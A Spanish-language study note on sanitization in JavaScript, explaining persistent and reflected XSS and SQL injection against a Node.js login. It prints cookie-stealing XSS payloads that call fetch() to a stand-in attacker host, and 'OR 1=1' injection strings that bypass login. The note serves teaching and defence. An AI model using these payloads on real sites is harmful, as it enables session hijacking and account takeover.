#JavaScript - Programación JavaScript
proveniente de [[Índice -JavaScript]]

---
La sanitización del código es una parte importante de la programación, sobre todo cuando ponemos en disposición a usuarios servicios tales como foros, subida de fotos para su visualización de forma pública, u otros servicios que incluyen bases de datos. También, sirve para evitar el phishing a causa de una mala alitización de la página web.

La vulnerabilidad más grave por falta de sanitización es el [[Cross-Site Scripting (XSS)]], y en caso de que el back-end esté programado con Node.js, las [[Inyección SQL|Inyecciones SQL]].

---
## Cross-Site Scripting
El primer problema al que nos enfrentamos es el XSS. 
Lo primero, mediante la URL. En algunos casos, esta parte no se sanitiza, y se permiten las etiquetas `<script>`, `<iframe>`, `<object>`, `<embed>` y `<style>`, también los eventos `onclick`, `onerror`, `onmouseover`, etc., ya que estas etiquetas permiten la ejecución de código JS.

Pongamos 2 ejemplos:
### Ejemplo 1: Comentario en un foro (PERSISTENT-XSS)
En caso de que tengamos un foro y este admita comentarios, lo que se puede llegar a inyectar sería un `onerror`, de la siguiente manera:
```html
<img src="noexiste.png" onerror="fetch('https://atacante.es/robo/?c=' + document.cookie)">
```

Si no disponemos de sanitización, el comentario se guardará tal cual en la base de datos del foro, y cada vez que un usuario vaya a la sección de comentarios, o a veces solo por entrar a la página, su cookie de sesión se enviará al servidor del atacante (`https;//atacante.es/robo`), con el cual el atacante podrá ingresar directamente al usuario de la víctima.

### Ejemplo 2: Manipulación de URL ([[Phishing]])
En caso de que tengamos una tienda sin sanitizar, por ejemplo `ropa.com`, y al hacer la búsqueda de un producto, la URL se comporta de la siguiente manera:
```plain text
https://ropa.com/buscar?producto=camisa
```
Se podrá mandar una URL envenenada a otro usuario. En este caso, se utilizaría [[Ingenieria Social]] para que la víctima acepte pinchar en la URL que nosotros le pasemos, en este caso, diciendo algo como "¡Mira este descuento!".
La URL podría ser la siguiente:
```plain text
https://ropa.com/buscar?producto=<script>fetch('https://atacante.es/robo/?c='+document.cookie)</script>
```

En el momento que la víctima pinche en el enlace, su cookie de sesión se mandará al servidor del atacante, con el cual el atacante podrá ingresar directamente al usuario de la víctima.

---
## Inyección SQL
En el caso de que el back-end esté programado con Node.js y se tenga una base de datos, se puede hacer inyección SQL en caso de que la consulta por parte del node no se encuentre sanitizada.

Imaginemos que JS manda la consulta al node de la siguiente manera:
```javascript
const datos = { usuario:"usuario", password:"contraseña" };
fetch('/api/login', { method: 'POST', body: JSON.stringify(datos) });
```

Y el servidor procesa estos datos de la siguiente manera:
```javascript
const query = "SELECT * FROM usuarios WHERE nombre = '" + usuario + "' AND clave = '" + password + "'";
```

La consulta será vulnerable a SQLi. En caso de que el usuario pase como usuario `'' OR '1'='1'; --`, pasa lo siguiente:
```sql
SELECT * FROM usuarios WHERE nombre = '' OR '1'='1'; --AND clave='.' ;
```
Si nos damos cuenta, nombre queda vacío, pero también se pasa el parámetro `OR '1'='1'`, lo que le da la tabla completa de usuarios al atacante. Peor aún cuando este sabe el nombre de un usuario administrador:
Lo que pasa el atacante:
	user: `admin`
	password: `' OR '1'='1'`
```sql
SELECT * FROM usuarios WHERE nombre = 'admin' AND clave='' OR '1'='1';
```
Esto le garantiza el acceso al atacante al usuario admin.